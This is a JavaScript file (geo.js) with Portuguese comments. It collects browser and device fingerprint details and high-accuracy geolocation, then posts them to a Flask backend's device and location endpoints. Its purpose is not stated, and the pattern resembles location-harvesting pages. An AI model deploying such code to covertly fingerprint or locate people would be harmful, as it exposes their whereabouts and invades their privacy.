// geo.js

function gatherDeviceInformation(callback) {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  var brw;
  var wd = window.screen.width;
  var ht = window.screen.height;
  var graphics = navigator.gpu || navigator.graphics || 'Not Available';
  var ven = navigator.vendor;

  if (ver.indexOf('Firefox') != -1) {
      str = str.substring(str.indexOf(' Firefox/') + 1);
      str = str.split(' ');
      brw = str[0];
  } else if (ver.indexOf('Chrome') != -1) {
      str = str.substring(str.indexOf(' Chrome/') + 1);
      str = str.split(' ');
      brw = str[0];
  } else if (ver.indexOf('Safari') != -1) {
      str = str.substring(str.indexOf(' Safari/') + 1);
      str = str.split(' ');
      brw = str[0];
  } else if (ver.indexOf('Edge') != -1) {
      str = str.substring(str.indexOf(' Edge/') + 1);
      str = str.split(' ');
      brw = str[0];
  } else {
      brw = 'Not Available';
  }

  // Chama o callback com os dados do dispositivo coletados
  callback({ ptf: ptf, cc: cc, ram: ram, brw: brw, wd: wd, ht: ht, ven: ven, ren: graphics, os: os });
}

function getCurrentLocation(successCallback, errorCallback) {
  if (navigator.geolocation) {
      var options = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
      navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
  } else {
      errorCallback({ message: 'Geolocalização não suportada.' });
  }
}

function initializePage() {
  // Obter informações do dispositivo e enviar para o Flask
  gatherDeviceInformation(function(data) {
      fetch('/api/device_information', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(result => {
          console.log('Resposta do Flask:', result);
      })
      .catch(error => {
          console.error('Erro ao enviar dados do dispositivo para o Flask:', error);
      });
  });

  // Obter informações de localização e enviar para o Flask
  getCurrentLocation(function(position) {
      var locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude || 'Not Available',
          direction: position.coords.heading || 'Not Available',
          speed: position.coords.speed || 'Not Available'
      };

      fetch('/api/location_information', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(locationData)
      })
      .then(response => response.json())
      .then(result => {
          console.log('Resposta do Flask:', result);
      })
      .catch(error => {
          console.error('Erro ao enviar dados de localização para o Flask:', error);
      });
  }, function(error) {
      console.error('Erro ao obter localização:', error.message);
  });
}
